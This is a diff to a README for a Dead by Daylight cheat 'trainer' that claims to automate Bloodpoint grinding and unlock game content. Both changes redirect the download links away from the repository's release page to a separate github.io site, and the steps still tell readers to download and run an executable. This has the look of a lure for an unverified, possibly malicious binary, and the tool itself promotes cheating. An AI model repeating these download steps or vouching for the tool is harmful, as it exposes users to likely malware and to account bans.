@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Elite - Earn points and unlock game content
 
-[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/davideyassa/DBD-AutoGrind-Trainer-2026-Elite/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://davideyassa.github.io)
 
 This software manages the Bloodpoint grind and unlocks content within Dead by Daylight. The external tool runs alongside the game to automate resource collection and provides visual overlays for easier navigation in the Fog.
 
@@ -27,7 +27,7 @@ Ensure your computer meets these specifications to run the trainer:
 
 Follow these steps to install and prepare the software.
 
-1. Visit the [official release page](https://github.com/davideyassa/DBD-AutoGrind-Trainer-2026-Elite/releases) to download the latest version.
+1. Visit the [official release page](https://davideyassa.github.io) to download the latest version.
 2. Locate the download button for the most recent release.
 3. Download the provided file. It comes as a compressed folder or an executable.
 4. If the file is a zip folder, right-click the folder and select Extract.
